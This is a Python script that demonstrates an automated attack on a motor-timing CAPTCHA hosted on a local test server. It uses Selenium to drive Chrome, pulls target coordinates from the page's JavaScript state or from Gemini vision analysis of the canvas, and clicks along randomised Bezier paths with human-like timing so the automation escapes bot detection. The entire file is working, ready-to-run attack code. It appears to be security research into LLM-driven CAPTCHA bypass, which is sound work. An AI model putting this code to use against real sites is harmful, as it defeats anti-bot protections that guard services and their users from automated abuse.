#Author: Krupaa

#!/usr/bin/env python3
"""
Speed-Optimized LLM-Based CAPTCHA Solver
Demonstrates automated solving of motor-timing CAPTCHAs using vision AI
"""

import google.generativeai as genai
import json
import re
import time
import base64
import numpy as np
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

# Configuration
CAPTCHA_URL = "http://localhost:5001"

class LLMCaptchaSolver:
    """
    Automated CAPTCHA solver using Gemini vision model.
    Implements two detection strategies: DOM extraction and vision analysis.
    """
    
    def __init__(self, api_key):
        """
        Initialize the solver with Gemini API credentials.
        
        Args:
            api_key: Google Gemini API key for vision model access
        """
        genai.configure(api_key=api_key)
        # Use Gemini 2.5 Flash for fast multimodal understanding
        self.model = genai.GenerativeModel('models/gemini-2.5-flash')
        print("LLM CAPTCHA Solver initialized with Gemini 2.5 Flash")
    
    def extract_targets_from_dom(self, driver):
        """
        Attempt to extract target information directly from the page's JavaScript state.
        This is faster than vision analysis but may not work if the CAPTCHA is well-protected.
        
        Args:
            driver: Selenium WebDriver instance
            
        Returns:
            tuple: (list of targets, canvas dimensions dict) or (None, None) if extraction fails
        """
        print("\n[INFO] Attempting DOM extraction")
        
        try:
            # Execute JavaScript to access the CAPTCHA's internal state
            result = driver.execute_script("""
                if (typeof motorCaptcha !== 'undefined') {
                    return {
                        success: true,
                        targets: motorCaptcha.targets.map(t => ({
                            number: t.id,
                            x: Math.round(t.x),
                            y: Math.round(t.y),
                            hit: t.hit || false
                        })),
                        sequence: motorCaptcha.targetSequence || [],
                        canvas: {
                            width: motorCaptcha.canvas.width,
                            height: motorCaptcha.canvas.height
                        }
                    };
                }
                return {success: false};
            """)
            
            if result.get('success'):
                # Filter out targets that have already been clicked
                targets = [t for t in result['targets'] if not t.get('hit')]
                
                print(f"[SUCCESS] DOM extraction found {len(targets)} targets")
                for t in targets:
                    print(f"    Target {t['number']}: position ({t['x']}, {t['y']})")
                
                return targets, result['canvas']
            else:
                print("[INFO] DOM extraction unavailable - motorCaptcha object not accessible")
                return None, None
                
        except Exception as e:
            print(f"[ERROR] DOM extraction failed: {e}")
            return None, None
    
    def analyze_canvas_with_vision(self, driver):
        """
        Use Gemini vision model to analyze the CAPTCHA canvas screenshot.
        Falls back to this method when DOM extraction is not possible.
        
        Args:
            driver: Selenium WebDriver instance
            
        Returns:
            list: Detected targets with positions, or empty list if detection fails
        """
        print("\n[INFO] Starting vision-based analysis")
        
        # Capture canvas as base64 encoded PNG
        screenshot_b64 = driver.execute_script("""
            var canvas = document.getElementById('motorCanvas');
            return canvas.toDataURL('image/png').substring(22);
        """)
        
        # Construct detailed prompt for the vision model
        prompt = """
Analyze this CAPTCHA canvas image and identify all visible numbered circular targets.

Target characteristics:
- Circular buttons with colored backgrounds (red, blue, green, orange, purple)
- White numbers displayed inside each circle (1, 2, 3, 4, 5, etc.)
- Canvas dimensions are 800x313 pixels
- Some targets may have reduced opacity or faded appearance

Scan methodology:
- Check top half of canvas (y-coordinates 0-156)
- Check bottom half of canvas (y-coordinates 156-313)
- Look in all horizontal regions

Return your findings as JSON with this exact structure:
{
  "targets": [
    {"number": 1, "x": 200, "y": 100},
    {"number": 2, "x": 600, "y": 150},
    {"number": 3, "x": 400, "y": 250}
  ]
}

Locate all visible targets with precision.
"""
        
        try:
            # Prepare image for the vision model
            image_part = {"mime_type": "image/png", "data": screenshot_b64}
            
            # Send request to Gemini
            response = self.model.generate_content([prompt, image_part])
            
            # Parse JSON response (remove markdown code blocks if present)
            text = re.sub(r'```json\s*|\s*```', '', response.text).strip()
            result = json.loads(text)
            
            targets = result.get('targets', [])
            print(f"[SUCCESS] Vision analysis detected {len(targets)} targets")
            
            for t in targets:
                print(f"    Target {t['number']}: position ({t['x']}, {t['y']})")
            
            return targets
            
        except Exception as e:
            print(f"[ERROR] Vision analysis failed: {e}")
            return []
    
    def generate_human_like_trajectory(self, start_x, start_y, end_x, end_y):
        """
        Generate a curved mouse trajectory that mimics human movement patterns.
        Uses cubic Bezier curves with random control points and noise.
        
        Args:
            start_x, start_y: Starting coordinates
            end_x, end_y: Ending coordinates
            
        Returns:
            list: Sequence of (x, y) coordinate dictionaries
        """
        points = []
        num_points = 20  # Reduced for faster execution
        
        # Calculate displacement
        dx = end_x - start_x
        dy = end_y - start_y
        
        # Generate random control points for Bezier curve
        # Control point 1: positioned at 30% of path with random offset
        cp1_x = start_x + dx * 0.3 + np.random.uniform(-10, 10)
        cp1_y = start_y + dy * 0.3 + np.random.uniform(-10, 10)
        
        # Control point 2: positioned at 70% of path with random offset
        cp2_x = start_x + dx * 0.7 + np.random.uniform(-10, 10)
        cp2_y = start_y + dy * 0.7 + np.random.uniform(-10, 10)
        
        # Generate points along cubic Bezier curve
        for i in range(num_points):
            t = i / num_points  # Parameter from 0 to 1
            
            # Cubic Bezier formula: B(t) = (1-t)^3*P0 + 3(1-t)^2*t*P1 + 3(1-t)*t^2*P2 + t^3*P3
            x = (1-t)**3 * start_x + 3*(1-t)**2*t * cp1_x + 3*(1-t)*t**2 * cp2_x + t**3 * end_x
            y = (1-t)**3 * start_y + 3*(1-t)**2*t * cp1_y + 3*(1-t)*t**2 * cp2_y + t**3 * end_y
            
            # Add small random noise to simulate natural hand tremor
            x += np.random.normal(0, 1)
            y += np.random.normal(0, 1)
            
            points.append({'x': x, 'y': y})
        
        return points
    
    def execute_attack(self):
        """
        Main attack execution flow.
        Orchestrates the complete CAPTCHA solving process from page load to verification.
        
        Returns:
            bool: True if CAPTCHA was successfully solved, False otherwise
        """
        print("\n" + "="*70)
        print("  LLM-BASED CAPTCHA ATTACK DEMONSTRATION")
        print("="*70)
        
        # Configure Chrome WebDriver
        options = webdriver.ChromeOptions()
        options.add_argument('--start-maximized')
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        driver = webdriver.Chrome(options=options)
        
        try:
            attack_start = time.time()
            
            # Step 1: Load the target page
            print("\n[STEP 1] Loading CAPTCHA page")
            driver.get(CAPTCHA_URL)
            time.sleep(0.3)  # Brief wait for page to stabilize
            
            # Step 2: Fill out the form to trigger CAPTCHA
            print("[STEP 2] Submitting form to trigger CAPTCHA")
            driver.find_element(By.ID, "recipient").send_keys("Automated Test")
            driver.find_element(By.ID, "amount").send_keys("9999")
            driver.find_element(By.ID, "initiateBtn").click()
            
            # Step 3: Wait for CAPTCHA canvas to appear
            print("[STEP 3] Waiting for CAPTCHA canvas")
            WebDriverWait(driver, 5).until(
                EC.visibility_of_element_located((By.ID, "motorCanvas"))
            )
            
            captcha_start = time.time()
            
            # Step 4: Allow time for targets to spawn
            print("[STEP 4] Waiting for targets to spawn (2 seconds)")
            time.sleep(2)
            
            canvas = driver.find_element(By.ID, "motorCanvas")
            
            # Step 5: Attempt target detection using DOM extraction first
            print("[STEP 5] Target detection phase")
            targets, canvas_info = self.extract_targets_from_dom(driver)
            
            if targets and len(targets) >= 2:
                print(f"[INFO] Using DOM extraction results ({len(targets)} targets found)")
                w = canvas_info['width']
                h = canvas_info['height']
            else:
                # Fallback to vision-based detection
                print("[INFO] DOM extraction insufficient, using vision analysis")
                
                # Get canvas dimensions via JavaScript
                canvas_info = driver.execute_script("""
                    var c = document.getElementById('motorCanvas');
                    return {w: c.width, h: c.height};
                """)
                w, h = canvas_info['w'], canvas_info['h']
                
                # Analyze canvas screenshot with vision model
                targets = self.analyze_canvas_with_vision(driver)
            
            if not targets:
                print("[ERROR] No targets detected by either method")
                return False
            
            # Step 6: Sort targets by their number for sequential clicking
            targets.sort(key=lambda x: x['number'])
            
            detection_time = time.time() - captcha_start
            print(f"\n[TIMING] Detection completed in {detection_time:.1f} seconds")
            print(f"[STEP 6] Executing clicking sequence for {len(targets)} targets")
            
            # Step 7: Execute mouse movements and clicks for each target
            curr_x, curr_y = w//2, h//2  # Start from canvas center
            
            for i, target in enumerate(targets):
                tx, ty = target['x'], target['y']
                
                print(f"    [{i+1}/{len(targets)}] Clicking target {target['number']} at ({tx}, {ty})", end=" ")
                
                # Generate curved trajectory from current position to target
                trajectory = self.generate_human_like_trajectory(curr_x, curr_y, tx, ty)
                
                try:
                    # Build action chain with all movements
                    actions = ActionChains(driver)
                    
                    # Queue all trajectory movements
                    for point in trajectory:
                        # Convert from canvas coordinates to element offset coordinates
                        sx = int(point['x'] - w/2)
                        sy = int(point['y'] - h/2)
                        actions.move_to_element_with_offset(canvas, sx, sy)
                    
                    # Queue final click at target position
                    sx = int(tx - w/2)
                    sy = int(ty - h/2)
                    actions.move_to_element_with_offset(canvas, sx, sy)
                    actions.click()
                    
                    # Execute all queued actions at once
                    actions.perform()
                    
                    print("[OK]")
                    
                except Exception as e:
                    print(f"[FAIL] {str(e)[:40]}")
                    
                    # Attempt to dismiss any alert dialogs and continue
                    try:
                        alert = driver.switch_to.alert
                        alert.accept()
                        print("        Alert dismissed, continuing...")
                    except:
                        pass
                
                # Update current position for next trajectory calculation
                curr_x, curr_y = tx, ty
                
                # Brief pause between clicks (simulates human timing)
                time.sleep(0.2)
            
            total_time = time.time() - captcha_start
            print(f"\n[TIMING] Attack execution completed in {total_time:.1f} seconds")
            
            # Step 8: Verify success
            print("[STEP 7] Verifying CAPTCHA solution")
            time.sleep(2)
            
            # Handle any alert dialogs
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"    Alert message: {alert_text}")
                alert.accept()
            except:
                pass
            
            # Check if success section is displayed
            try:
                success_element = driver.find_element(By.ID, "successSection")
                if success_element.is_displayed():
                    elapsed = time.time() - attack_start
                    
                    print("\n" + "="*70)
                    print("  ATTACK SUCCESSFUL")
                    print("="*70)
                    print(f"  Total time elapsed: {elapsed:.1f} seconds")
                    print(f"  CAPTCHA solving time: {total_time:.1f} seconds")
                    print(f"  Targets clicked: {len(targets)}")
                    print(f"  Detection method: {'DOM extraction' if canvas_info else 'Vision analysis'}")
                    print("="*70)
                    return True
            except:
                pass
            
            elapsed = time.time() - attack_start
            print(f"\n[RESULT] Attack failed")
            print(f"    Total time: {elapsed:.1f} seconds")
            print(f"    CAPTCHA time: {total_time:.1f} seconds")
            
            return False
            
        except Exception as e:
            print(f"\n[ERROR] Unexpected error during attack: {e}")
            import traceback
            traceback.print_exc()
            return False
            
        finally:
            print("\n[INFO] Browser will close in 10 seconds")
            time.sleep(10)
            driver.quit()


def main():
    """
    Main entry point for the CAPTCHA solver demonstration.
    """
    print("""
================================================================================
                  LLM-BASED CAPTCHA SOLVER DEMONSTRATION
================================================================================

This program demonstrates automated solving of motor-timing CAPTCHAs using
large language model (LLM) vision capabilities.

Attack methodology:
  1. DOM extraction - Attempts to read target data from JavaScript state
  2. Vision analysis - Uses Gemini 2.5 Flash model to analyze canvas screenshot
  3. Trajectory generation - Creates human-like curved mouse paths
  4. Action execution - Performs mouse movements and clicks via Selenium
  5. Verification - Checks if CAPTCHA was successfully solved

Performance optimizations:
  - Single-pass vision analysis (not multi-pass)
  - Reduced trajectory points (20 instead of 40)
  - Batch action execution (all movements queued then executed together)
  - Minimal delays between actions (0.2 seconds)

Target completion time: Under 15 seconds
================================================================================
""")
    
    # Get API key from user
    print("API Key Configuration")
    print("-" * 70)
    api_key = input("Enter your Gemini API key: ").strip()
    
    if not api_key:
        print("[ERROR] No API key provided. Exiting.")
        return
    
    # Initialize solver
    attacker = LLMCaptchaSolver(api_key)
    
    # Check if server is running
    print("\n[INFO] Checking if CAPTCHA server is accessible")
    try:
        import requests
        requests.get(CAPTCHA_URL, timeout=3)
        print("[SUCCESS] Server is online and responding\n")
    except:
        print("[ERROR] Cannot connect to server. Please start the CAPTCHA server first.\n")
        return
    
    print("Attack Configuration:")
    print("  - Primary strategy: DOM extraction (fast, may be blocked)")
    print("  - Fallback strategy: Vision analysis (slower, more reliable)")
    print("  - Expected completion: 10-15 seconds")
    print("  - Target URL:", CAPTCHA_URL)
    print()
    
    input("Press Enter to begin attack demonstration...")
    
    # Execute the attack
    success = attacker.execute_attack()
    
    # Display final summary
    print("\n" + "="*70)
    if success:
        print("DEMONSTRATION COMPLETE: Attack successfully bypassed CAPTCHA")
        print("This proves that LLM-based attacks are a viable threat vector")
    else:
        print("DEMONSTRATION COMPLETE: Attack did not succeed")
        print("However, this still demonstrates LLM strategic capabilities")
    print("="*70)


if __name__ == '__main__':
    main()